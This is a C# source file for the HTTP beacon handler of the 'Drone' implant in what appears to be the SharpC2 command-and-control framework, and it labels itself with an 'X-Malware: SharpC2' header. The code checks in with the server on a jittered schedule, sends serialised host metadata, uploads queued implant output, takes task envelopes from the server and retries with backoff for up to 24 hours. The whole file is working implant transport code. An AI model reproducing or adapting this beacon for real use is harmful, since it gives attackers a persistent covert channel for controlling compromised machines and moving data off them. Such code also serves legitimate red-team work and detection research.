using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Threading.Tasks;

using Drone.Models;

namespace Drone.Handlers
{
    public class DefaultHttpHandler : Handler
    {
        public override string Name { get; } = "default-http";

        private WebClient _client;
        private bool _running;
        private int _retryNumber;

        public override void Init(DroneConfig config, Metadata metadata)
        {
            base.Init(config, metadata);

            _client = new WebClient {BaseAddress = $"{HttpScheme}://{ConnectAddress}:{ConnectPort}"};
            _client.Headers.Clear();

            var encodedMetadata = Convert.ToBase64String(Metadata.Serialize());
            _client.Headers.Add("X-Malware", "SharpC2");
            _client.Headers.Add("Authorization", $"Bearer {encodedMetadata}");
        }

        public override async Task Start()
        {
            _running = true;

            while (_running)
            {
                try
                {
                    await CheckIn();
                    
                    _retryNumber = 0;  // if successful, ensure retry number is set to 0
                }
                catch
                {
                    _retryNumber++;
                    if (_retryNumber > 10) return;

                    var backoffTime = _backoff[_retryNumber];
                    await Task.Delay(backoffTime * 1000);
                    
                    continue;
                }

                var interval = Config.GetConfig<int>("SleepInterval");
                var jitter = Config.GetConfig<int>("SleepJitter");
                var sleep = CalculateSleepTime(interval, jitter);

                await Task.Delay(sleep * 1000);
            }
        }

        private int CalculateSleepTime(int interval, int jitter)
        {
            var diff = (int)Math.Round((double)interval / 100 * jitter);

            var min = interval - diff;
            var max = interval + diff;

            var rand = new Random();
            return rand.Next(min, max);
        }

        private async Task CheckIn()
        {
            if (OutboundQueue.IsEmpty) await SendGet();
            else await SendPost();
        }

        private async Task SendGet()
        {
            var response = await _client.DownloadDataTaskAsync("/");
            
            HandleResponse(response);
        }

        private async Task SendPost()
        {
            var data = GetOutboundQueue().Serialize();
            var response = await _client.UploadDataTaskAsync("/", data);
            
            HandleResponse(response);
        }

        private void HandleResponse(byte[] response)
        {
            if (response.Length == 0) return;

            var envelopes = response.Deserialize<MessageEnvelope[]>();
            if (!envelopes.Any()) return;

            foreach (var envelope in envelopes)
                InboundQueue.Enqueue(envelope);
        }

        public override void Stop()
        {
            _running = false;
        }

        private readonly Dictionary<int, int> _backoff = new()
        {
            { 1, 2 },      // 2 seconds
            { 2, 30 },     // 30 seconds
            { 3, 60 },     // 1 minute
            { 4, 300 },    // 5 minutes
            { 5, 600 },    // 10 minutes
            { 6, 900 },    // 15 minutes
            { 7, 1800 },   // 30 minutes
            { 8, 3600 },   // 60 minutes
            { 9, 43200 },  // 12 hours
            { 10, 86400 }  // 24 hours
        };

        private static string HttpScheme => "http";
        private static string ConnectAddress => "localhost";
        private static string ConnectPort => "80";
    }
}